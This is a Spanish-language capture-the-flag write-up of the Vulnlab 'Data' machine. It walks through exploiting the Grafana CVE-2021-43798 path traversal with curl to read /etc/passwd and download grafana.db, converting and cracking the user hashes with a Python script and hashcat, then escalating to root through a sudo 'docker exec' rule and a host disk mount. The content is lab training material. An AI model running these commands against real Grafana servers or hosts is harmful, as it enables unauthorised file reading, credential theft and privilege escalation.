---
layout: single
title: Data - Vulnlab
excerpt: "En este post vamos a estar haciendo la máquina Data de la plataforma de Vulnlab es una máquina linux donde estaremos explotando el CVE-2021-43798 de Grafana en el cual podremos leer archivos gracias al LFI y asi podremos obtener un .db para poder ver los hashes de los usuarios y crackearlos para la escalada de privilegios abusaremos de un privilegio a nivel de sudoers con él podemos ejecutar docker exec y estaremos como root después crearemos una montura para poder ver la flag del usuario root."
date: 2024-02-26
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/Data-vulnlab/icon.png
  teaser_home_page: true
categories:
  - Vulnlab
tags:  
  - CVE-2021-43798
  - Cracking Hashes
  - Sudoers Privilege
  - Docker
---

## PortScan

- Vamos a empezar escaneando los puertos abiertos por el protocolo **TCP** y sus tecnologías que corren en esos puertos.

```bash
➜  nmap nmap -sCV -p22,3000 10.10.86.89 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-26 10:36 CST
Nmap scan report for 10.10.86.89
Host is up (0.19s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 f7:80:11:6b:7e:c6:6c:f8:40:a8:04:65:96:ea:9a:81 (RSA)
|   256 ed:5b:de:89:e0:13:46:02:af:49:f6:7a:a2:dd:4f:fc (ECDSA)
|_  256 69:08:62:31:2d:ba:ce:41:b5:d9:5c:d8:d3:b9:ef:be (ED25519)
3000/tcp open  ppp?
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 26 Feb 2024 16:37:42 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 26 Feb 2024 16:37:08 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   HTTPOptions:
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 26 Feb 2024 16:37:14 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.94SVN%I=7%D=2/26%Time=65DCBE34%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(GetRequest,174,"HTTP/1\.0\x20302\x20Found\r\nCache-Con
SF:trol:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nEx
SF:pires:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\r\nSet-Cooki
SF:e:\x20redirect_to=%2F;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Con
SF:tent-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Prot
SF:ection:\x201;\x20mode=block\r\nDate:\x20Mon,\x2026\x20Feb\x202024\x2016
SF::37:08\x20GMT\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Fou
SF:nd</a>\.\n\n")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent
SF:-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n4
SF:00\x20Bad\x20Request")%r(HTTPOptions,12E,"HTTP/1\.0\x20302\x20Found\r\n
SF:Cache-Control:\x20no-cache\r\nExpires:\x20-1\r\nLocation:\x20/login\r\n
SF:Pragma:\x20no-cache\r\nSet-Cookie:\x20redirect_to=%2F;\x20Path=/;\x20Ht
SF:tpOnly;\x20SameSite=Lax\r\nX-Content-Type-Options:\x20nosniff\r\nX-Fram
SF:e-Options:\x20deny\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x2
SF:0Mon,\x2026\x20Feb\x202024\x2016:37:14\x20GMT\r\nContent-Length:\x200\r
SF:\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConten
SF:t-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n
SF:400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20
SF:Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:
SF:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTT
SF:P/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20char
SF:set=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSS
SF:essionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent
SF:-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n4
SF:00\x20Bad\x20Request")%r(FourOhFourRequest,1A1,"HTTP/1\.0\x20302\x20Fou
SF:nd\r\nCache-Control:\x20no-cache\r\nContent-Type:\x20text/html;\x20char
SF:set=utf-8\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cac
SF:he\r\nSet-Cookie:\x20redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity\.
SF:txt%252ebak;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Content-Type-
SF:Options:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protection:\x2
SF:01;\x20mode=block\r\nDate:\x20Mon,\x2026\x20Feb\x202024\x2016:37:42\x20
SF:GMT\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Found</a>\.\n
SF:\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Grafana CVE-2021-43798

- Pues bueno, vemos que nos redirige a un panel de login que como tal está corriendo **Grafana**.

```bash
➜  nmap curl -s -I http://10.10.86.89:3000
HTTP/1.1 302 Found
Cache-Control: no-cache
Content-Type: text/html; charset=utf-8
Expires: -1
Location: /login
Pragma: no-cache
Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
X-Content-Type-Options: nosniff
X-Frame-Options: deny
X-Xss-Protection: 1; mode=block
Date: Mon, 26 Feb 2024 16:40:00 GMT

➜  nmap whatweb http://10.10.86.89:3000/login
http://10.10.86.89:3000/login [200 OK] Country[RESERVED][ZZ], Grafana[8.0.0], HTML5, IP[10.10.86.89], Script[text/javascript], Title[Grafana], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block]
```

- Vemos la versión que está empleando **Grafana**.

<p align="center">
<img src="https://i.imgur.com/IO2lTsI.png">
</p>

- Si empleamos las credenciales por defecto aun así no funcionan.

<p align="center">
<img src="https://i.imgur.com/twqbdcY.png">
</p>

- Si buscamos vulnerabilidades encontramos un **Directory Traversal and Arbitrary File Read**.

```bash
➜  nmap searchsploit grafana 8
----------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                   |  Path
----------------------------------------------------------------------------------------------------------------- ---------------------------------
Grafana 7.0.1 - Denial of Service (PoC)                                                                          | linux/dos/48638.sh
Grafana 8.3.0 - Directory Traversal and Arbitrary File Read                                                      | multiple/webapps/50581.py
Grafana <=6.2.4 - HTML Injection                                                                                 | typescript/webapps/51073.txt
----------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

- Si inspeccionamos el script vemos como funciona la vulnerabilidad.

<p align="center">
<img src="https://i.imgur.com/CTYKQBF.png">
</p>

- Si buscamos vulnerabilidades vemos que como tal si existe la vulnerabilidad y podemos explotarla <https://pentest-tools.com/vulnerabilities-exploits/grafana-v8x-arbitrary-file-read_2187> .

- Aquí nos dicen como funciona <https://github.com/taythebot/CVE-2021-43798>. 

- Si enviamos una petición con el método **GET** vemos que obtenemos el **/etc/passwd** .

```bash
➜  nmap curl --path-as-is http://10.10.86.89:3000/public/plugins/alertlist/../../../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
grafana:x:472:0:Linux User,,,:/home/grafana:/sbin/nologin
➜  nmap
```

- En el repositorio de **GitHub** nos hablan de que podemos obtener el archivo **grafana.db** vamos a descargarlo empleando **curl**.

```bash
➜  content curl -s -o grafana.db --path-as-is http://10.10.86.89:3000/public/plugins/welcome/../../../../../../../../var/lib/grafana/grafana.db
```

- Ahora vamos a abrir él **.db** para inspeccionarlo.

```bash
➜  content sqlitebrowser grafana.db
```

- Vemos los hashes de 2 usuarios.

<p align="center">
<img src="https://i.imgur.com/9w7FxF9.png">
</p>

- Los **Hashes** usan **PBKDF2-HMAC-SHA256** <https://github.com/iamaldi/grafana2hashcat/blob/main/README.md>.

<p align="center">
<img src="https://i.imgur.com/NX58ccV.png">
</p>

- Pero aun así podemos crackearlos con **Hashcat** <https://vulncheck.com/blog/grafana-cve-2021-43798>, solamente necesitamos transformar los **hashes**.

- Nos dan un script de **go** para generar un formato de hash correcto.

```bash
// grab the usernames, passwords and salts from the downloaded db
rows, err := db.Query("select email,password,salt,is_admin from user")
if err != nil {
    return
}
defer rows.Close()

for rows.Next() {
    var email string
    var password string
    var salt string
    err = rows.Scan(&email, &password, &salt)
    if err != nil {
     return false
    }

    decoded_hash, _ := hex.DecodeString(password)
    hash64 := b64.StdEncoding.EncodeToString([]byte(decoded_hash))
    salt64 := b64.StdEncoding.EncodeToString([]byte(salt))
    _, _ = hash_file.WriteString("sha256:10000:" + salt64 + ":" + hash64 + "\n")
}
```

- Pero podemos crear un script en **Python3** que haga lo mismo.

```bash
➜  exploits cat gethash.py
#!/usr/bin/env python3

import sqlite3
import base64
import hashlib

# Nos conectamos
conn = sqlite3.connect('grafana.db')
cursor = conn.cursor()

# Filtramos directamente por la data que nos interesa
cursor.execute("SELECT email, password, salt, is_admin FROM user")

# Obtenemos todas las filas
rows = cursor.fetchall()

# Recorremos las filas con un bucle for
for row in rows:
    email, password, salt, is_admin = row

    # Decodifimos la contraseña de hexadecimal
    decoded_hash = bytes.fromhex(password)

    # Codificamos la contraseña y la sal a base64
    hash64 = base64.b64encode(decoded_hash).decode('utf-8')
    salt64 = base64.b64encode(salt.encode('utf-8')).decode('utf-8')

    # Lo guardamos en un archivo hash_file.txt
    with open("hash_file.txt", "a") as hash_file:
        hash_file.write(f"sha256:10000:{salt64}:{hash64}\n")

# cerramos la conexion ala base de datos
conn.close()
➜  exploits
```

- Una vez ejecutado obtenemos los **hashes** .

```bash
➜  exploits cat hash_file.txt
sha256:10000:WU9iU29MajU1Uw==:epGeS76Vz1EE7fNU7i5iNO+sHKH4FCaESiTE32ExMizzcjySFkthcunnP696TCBy+Pg=
sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=
➜  exploits
```

- Ahora buscamos el modo que usaremos en **hashcat** <https://hashcat.net/wiki/doku.php?id=example_hashes> .

<p align="center">
<img src="https://i.imgur.com/LidRLa9.png">
</p>

Ahora crackeamos los **hashes** .

```bash
➜  exploits hashcat -m 10900 hash_file.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-skylake-avx512-Intel(R) Core(TM) i5-1035G1 CPU @ 1.00GHz, 1426/2916 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=:*********1
Cracking performance lower than expected?

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =>
```

## Shell as Boris

- Ahora nos podemos conectar por **ssh** .

```bash
➜  exploits ssh boris@10.10.86.89
The authenticity of host '10.10.86.89 (10.10.86.89)' can't be established.
ED25519 key fingerprint is SHA256:aTbKZv5Xp7PLsA5FUClvNUBdrInhhfMfeGbEfWDhRfg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.86.89' (ED25519) to the list of known hosts.
boris@10.10.86.89's password:
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-1060-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Feb 26 17:26:55 UTC 2024

  System load:  0.0               Processes:              99
  Usage of /:   19.8% of 7.69GB   Users logged in:        0
  Memory usage: 24%               IP address for eth0:    10.10.86.89
  Swap usage:   0%                IP address for docker0: 172.17.0.1


0 updates can be applied immediately.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


Last login: Sun Jan 23 13:11:53 2022 from 10.10.1.254
boris@ip-10-10-10-11:~$ whoami
boris
boris@ip-10-10-10-11:~$
```

## User flag

- Y en nuestro **home** podemos ver la flag.

```bash
boris@ip-10-10-10-11:~$ cat user.txt
VL{*****************************}
boris@ip-10-10-10-11:~$ pwd
/home/boris
boris@ip-10-10-10-11:~$
```

## Privilege Escalation

- Podemos ejecutar como root sin proporcionar contraseña **docker exec** .

```bash
boris@ip-10-10-10-11:~$ sudo -l
Matching Defaults entries for boris on ip-10-10-10-11:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User boris may run the following commands on ip-10-10-10-11:
    (root) NOPASSWD: /snap/bin/docker exec *
boris@ip-10-10-10-11:~$
```

- Si leemos el archivo **/etc/passwd** no existe el usuario Grafana.

```bash
boris@ip-10-10-10-11:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
boris:x:1001:1001:,,,:/home/boris:/bin/bash
```

- A pesar de que con **curl** pudimos verlo, lo más probable es que ese usuario esté en un contenedor, podemos ver el nombre del contenedor mediante el **LFI** .

```bash
➜  ~ curl --path-as-is http://10.10.86.89:3000/public/plugins/alertlist/../../../../../../../../etc/hostname
e6ff5b1cbc85
➜  ~
```

- Ahora teniendo el nombre del contenedor podemos ejecutar una **bash** dentro.

```bash
boris@ip-10-10-10-11:~$ sudo docker exec -it --privileged -u root e6ff5b1cbc85 bash
bash-5.1# whoami
root
bash-5.1#
```

- Ahora vemos los discos.

```bash
bash-5.1# fdisk -l
Disk /dev/xvda: 8192 MB, 8589934592 bytes, 16777216 sectors
6367 cylinders, 85 heads, 31 sectors/track
Units: sectors of 1 * 512 = 512 bytes

Device   Boot StartCHS    EndCHS        StartLBA     EndLBA    Sectors  Size Id Type
/dev/xvda1 *  0,32,33     20,84,31          2048   16777182   16775135 8190M 83 Linux
bash-5.1#
```

- Y ahora creamos una montura para poder ver la flag.

```bash
bash-5.1# mkdir -p /mnt/pwned
bash-5.1# mount /dev/xvda1 /mnt/pwned
bash-5.1# cd /mnt/pwned/root
bash-5.1#
```

## Root flag

- Ahora podemos ver la flag.

```
bash-5.1# cat root.txt
VL{***************************}
bash-5.1#
```
